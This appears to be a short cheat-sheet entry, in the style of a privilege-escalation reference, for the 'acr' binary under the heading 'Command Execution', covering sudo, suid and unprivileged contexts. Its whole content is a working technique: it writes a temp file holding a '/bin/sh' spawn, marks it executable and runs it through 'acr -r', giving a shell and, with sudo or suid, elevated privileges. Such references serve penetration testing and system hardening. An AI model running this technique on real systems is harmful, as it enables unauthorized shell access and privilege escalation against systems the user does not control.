title: acr
html:
acr

Command Execution

Context: sudo, suid, unprivileged

echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file
